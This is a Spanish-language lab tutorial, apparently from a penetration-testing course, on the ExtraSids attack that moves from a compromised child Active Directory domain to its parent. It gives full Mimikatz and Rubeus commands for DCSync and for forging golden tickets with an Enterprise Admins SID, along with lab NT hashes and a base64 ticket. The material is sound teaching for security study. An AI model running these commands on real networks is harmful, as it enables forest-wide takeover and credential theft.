## SID History Primer

El atributo [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) se usa en escenarios de migración. Si un usuario en un dominio se migra a otro dominio, se crea una nueva cuenta en el segundo dominio. El SID del usuario original se agregará al atributo SID history del nuevo usuario, asegurando que el usuario aún pueda acceder a los recursos en el dominio original.

SID history está destinado a funcionar entre dominios, pero puede funcionar en el mismo dominio. Usando Mimikatz, un atacante puede realizar una inyección de SID history y agregar una cuenta de administrador al atributo SID History de una cuenta que controlan. Al iniciar sesión con esta cuenta, todos los SIDs asociados con la cuenta se agregan al token del usuario.

Este token se usa para determinar a qué recursos puede acceder la cuenta. Si el SID de una cuenta de Domain Admin se agrega al atributo SID History de esta cuenta, entonces esta cuenta podrá realizar DCSync y crear un [Golden Ticket](https://attack.mitre.org/techniques/T1558/001/) o un ticket de concesión de tickets de Kerberos (TGT), lo que nos permitirá autenticarnos como cualquier cuenta en el dominio de nuestra elección para una persistencia adicional.

---

## ExtraSids Attack - Mimikatz

Este ataque permite comprometer un dominio principal una vez que se ha comprometido el dominio hijo. Dentro del mismo forest de AD, la propiedad [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) se respeta debido a la falta de protección de [SID Filtering](https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html). SID Filtering es una protección implementada para filtrar solicitudes de autenticación de un dominio en otro forest a través de una trust. Por lo tanto, si un usuario en un dominio hijo tiene su sidHistory configurado en el `Enterprise Admins group` (que solo existe en el dominio principal), se le trata como miembro de este grupo, lo que permite el acceso administrativo a todo el forest. En otras palabras, estamos creando un Golden Ticket desde el dominio hijo comprometido para comprometer el dominio principal. En este caso, aprovecharemos el `SIDHistory` para otorgar a una cuenta (o cuenta inexistente) derechos de Enterprise Admin modificando este atributo para contener el SID del grupo de Enterprise Admins, lo que nos dará acceso completo al dominio principal sin ser parte del grupo.

Para realizar este ataque después de comprometer un dominio hijo, necesitamos lo siguiente:

- El hash de KRBTGT para el dominio hijo
- El SID para el dominio hijo
- El nombre de un usuario objetivo en el dominio hijo (¡no necesita existir!)
- El FQDN del dominio hijo.
- El SID del grupo Enterprise Admins del dominio raíz.
- Con estos datos recopilados, el ataque se puede realizar con Mimikatz.

Ahora podemos recopilar cada pieza de datos requerida para realizar el ataque ExtraSids. Primero, necesitamos obtener el NT hash para la cuenta [KRBTGT](https://adsecurity.org/?p=483), que es una cuenta de servicio para el Key Distribution Center (KDC) en Active Directory. La cuenta KRB (Kerberos) TGT (Ticket Granting Ticket) se usa para cifrar/firmar todos los tickets de Kerberos concedidos dentro de un dominio dado. Los controladores de dominio usan la contraseña de la cuenta para descifrar y validar los tickets de Kerberos. La cuenta KRBTGT se puede usar para crear tickets de TGT de Kerberos que se pueden usar para solicitar tickets de TGS para cualquier servicio en cualquier host en el dominio. Esto también se conoce como el ataque Golden Ticket y es un mecanismo de persistencia bien conocido para los atacantes en entornos de Active Directory. La única forma de invalidar un Golden Ticket es cambiar la contraseña de la cuenta KRBTGT, lo que debe hacerse periódicamente y definitivamente después de una evaluación de prueba de penetración donde se alcance el compromiso completo del dominio.

Dado que hemos comprometido el dominio hijo, podemos iniciar sesión como Domain Admin o similar y realizar el ataque DCSync para obtener el NT hash de la cuenta KRBTGT.

### Obtaining the KRBTGT Account's NT Hash using Mimikatz

```r
PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'LOGISTICS\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/1/2021 11:21:33 AM
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
    ntlm- 0: 9d765b482771505cbe97411065964d5f
    lm  - 0: 69df324191d4a80f0ed100c10f20561e
```

Podemos usar la función `Get-DomainSID` de PowerView para obtener el SID del dominio hijo, pero esto también es visible en la salida de Mimikatz anterior.

### Using Get-DomainSID

```r
PS C:\htb> Get-DomainSID

S-1-5-21-2806153819-209893948-922872689
```

A continuación, podemos usar `Get-DomainGroup` de PowerView para obtener el SID del grupo Enterprise Admins en el dominio principal. También podríamos hacer esto con el cmdlet [Get-ADGroup](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps) con un comando como `Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"`.

### Obtaining Enterprise Admins Group's SID using Get-DomainGroup

```r
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                       objectsid                                    
-----------------                                       ---------                                    
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```

En este punto, hemos recopilado los siguientes puntos de datos:

- El hash de KRBTGT para el dominio hijo: `9d765b482771505cbe97411065964d5f`
- El SID para el dominio hijo: `S-1-5-21-2806153819-209893948-922872689`
- El nombre de un usuario objetivo en el dominio hijo (¡no necesita existir para crear nuestro Golden Ticket!): Elegiremos un usuario falso: `hacker`
- El FQDN del dominio hijo: `LOGISTICS.INLANEFREIGHT.LOCAL`
- El SID del grupo Enterprise Admins del dominio raíz: `S-1-5-21-3842939050-3880317879-2865463114-519`

Antes del ataque, podemos confirmar que no hay acceso al sistema de archivos del DC en el dominio principal.

### Using ls to Confirm No Access

```r
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied
At line:1 char:1
+ ls \\academy-ea-dc01.inlanefreight.local\c$
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

Usando Mimikatz y los datos listados anteriormente, podemos crear un Golden Ticket para acceder a todos los recursos dentro del dominio principal.

### Creating a Golden Ticket with Mimikatz

```r
PS C:\htb> mimikatz.exe

mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
Lifetime  : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
```

Podemos confirmar que el ticket de Kerberos para el usuario hacker inexistente está residiendo en la memoria.

### Confirming a Kerberos Ticket is in Memory Using klist

```r
PS C:\htb> klist

Current LogonId is 0:0xf6462

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/28/2022 19:59:50 (local)
        End Time:   3/25/2032 19:59:50 (local)
        Renew Time: 3/25/2032 19:59:50 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

A partir de aquí, es posible acceder a cualquier recurso dentro del dominio principal, y podríamos comprometer el dominio principal de varias maneras.

### Listing the Entire C: Drive of the Domain Controller

```r
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
 Volume in drive \\academy-ea-dc01.inlanefreight.local\c$ has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\academy-ea-dc01.inlanefreight.local\c$

09/15/2018  12:19 AM    <DIR>          PerfLogs
10/06/2021  01:50 PM    <DIR>          Program Files
09/15/2018  02:06 AM    <DIR>          Program Files (x86)
11/19/2021  12:17 PM    <DIR>          Shares
10/06/2021  10:31 AM    <DIR>          Users
03/21/2022  12:18 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  18,080,178,176 bytes free
```

---

## ExtraSids Attack - Rubeus

También podemos realizar este ataque usando Rubeus. Primero, nuevamente, confirmaremos que no podemos acceder al sistema de archivos del controlador de dominio del dominio principal.

### Using ls to Confirm No Access Before Running Rubeus

```r
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied
At line:1 char:1
+ ls \\academy-ea-dc01.inlanefreight.local\c$
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], UnauthorizedAcces 
   sException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
	
<SNIP> 
```

A continuación, formularemos nuestro comando Rubeus usando los datos que recuperamos anteriormente. La flag `/rc4` es el NT hash para la cuenta KRBTGT. La flag `/sids` indicará a Rubeus que cree nuestro Golden Ticket dándonos los mismos derechos que los miembros del grupo Enterprise Admins en el dominio principal.

### Creating a Golden Ticket using Rubeus

```r
PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2 

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
[*] SID            : S-1-5-21-2806153819-209893948-922872689
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-3842939050-3880317879-2865463114-519
[*] ServiceKey     : 9D765B482771505CBE97411065964D5F
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 9D765B482771505CBE97411065964D5F
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'hacker@LOGISTICS.INLANEFREIGHT.LOCAL'

[*] AuthTime       : 3/29/2022 10:06:41 AM
[*] StartTime      : 3/29/2022 10:06:41 AM
[*] EndTime        : 3/29/2022 8:06:41 PM
[*] RenewTill      : 4/5/2022 10:06:41 AM

[*] base64(ticket.kirbi):
      doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoR8bHUxPR0lTVElDUy5JTkxBTkVG
      UkVJR0hULkxPQ0FMojIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5M
      T0NBTKOCBDIwggQuoAMCARehAwIBA6KCBCAEggQc0u5onpWKAP0Hw0KJuEOAFp8OgfBXlkwH3sXu5BhH
      T3zO/Ykw2Hkq2wsoODrBj0VfvxDNNpvysToaQdjHIqIqVQ9kXfNHM7bsQezS7L1KSx++2iX94uRrwa/S
      VfgHhAuxKPlIi2phwjkxYETluKl26AUo2+WwxDXmXwGJ6LLWN1W4YGScgXAX+Kgs9xrAqJMabsAQqDfy
      k7+0EH9SbmdQYqvAPrBqYEnt0mIPM9cakei5ZS1qfUDWjUN4mxsqINm7qNQcZHWN8kFSfAbqyD/OZIMc
      g78hZ8IYL+Y4LPEpiQzM8JsXqUdQtiJXM3Eig6RulSxCo9rc5YUWTaHx/i3PfWqP+dNREtldE2sgIUQm
      9f3cO1aOCt517Mmo7lICBFXUTQJvfGFtYdc01fWLoN45AtdpJro81GwihIFMcp/vmPBlqQGxAtRKzgzY
      acuk8YYogiP6815+x4vSZEL2JOJyLXSW0OPhguYSqAIEQshOkBm2p2jahQWYvCPPDd/EFM7S3NdMnJOz
      X3P7ObzVTAPQ/o9lSaXlopQH6L46z6PTcC/4GwaRbqVnm1RU0O3VpVr5bgaR+Nas5VYGBYIHOw3Qx5YT
      3dtLvCxNa3cEgllr9N0BjCl1iQGWyFo72JYI9JLV0VAjnyRxFqHztiSctDExnwqWiyDaGET31PRdEz+H
      WlAi4Y56GaDPrSZFS1RHofKqehMQD6gNrIxWPHdS9aiMAnhQth8GKbLqimcVrCUG+eghE+CN999gHNMG
      Be1Vnz8Oc3DIM9FNLFVZiqJrAvsq2paakZnjf5HXOZ6EdqWkwiWpbGXv4qyuZ8jnUyHxavOOPDAHdVeo
      /RIfLx12GlLzN5y7132Rj4iZlkVgAyB6+PIpjuDLDSq6UJnHRkYlJ/3l5j0KxgjdZbwoFbC7p76IPC3B
      aY97mXatvMfrrc/Aw5JaIFSaOYQ8M/frCG738e90IK/2eTFZD9/kKXDgmwMowBEmT3IWj9lgOixNcNV/
      OPbuqR9QiT4psvzLGmd0jxu4JSm8Usw5iBiIuW/pwcHKFgL1hCBEtUkaWH24fuJuAIdei0r9DolImqC3
      sERVQ5VSc7u4oaAIyv7Acq+UrPMwnrkDrB6C7WBXiuoBAzPQULPTWih6LyAwenrpd0sOEOiPvh8NlvIH
      eOhKwWOY6GVpVWEShRLDl9/XLxdnRfnNZgn2SvHOAJfYbRgRHMWAfzA+2+xps6WS/NNf1vZtUV/KRLlW
      sL5v91jmzGiZQcENkLeozZ7kIsY/zadFqVnrnQqsd97qcLYktZ4yOYpxH43JYS2e+cXZ+NXLKxex37HQ
      F5aNP7EITdjQds0lbyb9K/iUY27iyw7dRVLz3y5Dic4S4+cvJBSz6Y1zJHpLkDfYVQbBUCfUps8ImJij
      Hf+jggEhMIIBHaADAgEAooIBFASCARB9ggEMMIIBCKCCAQQwggEAMIH9oBswGaADAgEXoRIEEBrCyB2T
      JTKolmppTTXOXQShHxsdTE9HSVNUSUNTLklOTEFORUZSRUlHSFQuTE9DQUyiEzARoAMCAQGhCjAIGwZo
      YWNrZXKjBwMFAEDgAACkERgPMjAyMjAzMjkxNzA2NDFapREYDzIwMjIwMzI5MTcwNjQxWqYRGA8yMDIy
      MDMzMDAzMDY0MVqnERgPMjAyMjA0MDUxNzA2NDFaqB8bHUxPR0lTVElDUy5JTkxBTkVGUkVJR0hULkxP
      Q0FMqTIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5MT0NBTA==

[+] Ticket successfully imported!
```

Una vez más, podemos verificar que el ticket está en la memoria usando el comando `klist`.

### Confirming the Ticket is in Memory Using klist

```r
PS C:\htb> klist

Current LogonId is 0:0xf6495

Cached Tickets: (1)

#0>	Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
	Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
	Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent 
	Start Time: 3/29/2022 10:06:41 (local)
	End Time:   3/29/2022 20:06:41 (local)
	Renew Time: 4/5/2022 10:06:41 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: 
```

Finalmente, podemos probar este acceso realizando un ataque DCSync contra el dominio principal, apuntando al usuario de Domain Admin `lab_adm`.

### Performing a DCSync Attack

```r
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\lab_adm' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : lab_adm

** SAM ACCOUNT **

SAM Username         : lab_adm
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/27/2022 10:53:21 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
Object Relative ID   : 1001

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
    lm  - 0: 6053227db44e996fe16b107d9d1e95a0
```

Cuando se trata de múltiples dominios y nuestro dominio objetivo no es el mismo que el dominio del usuario, necesitaremos especificar el dominio exacto para realizar la operación DCSync en el controlador de dominio particular. El comando para esto se vería de la siguiente manera:

```r
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\lab_adm' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : lab_adm

** SAM ACCOUNT **

SAM Username         : lab_adm
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/27/2022 10:53:21 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
Object Relative ID   : 1001

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
    lm  - 0: 6053227db44e996fe16b107d9d1e95a0
```

---

## Next Steps

Ahora que hemos recorrido el compromiso de dominio child --> parent desde una caja de ataque de Windows, cubriremos algunas formas de lograr lo mismo si estamos restringidos a un host de ataque Linux.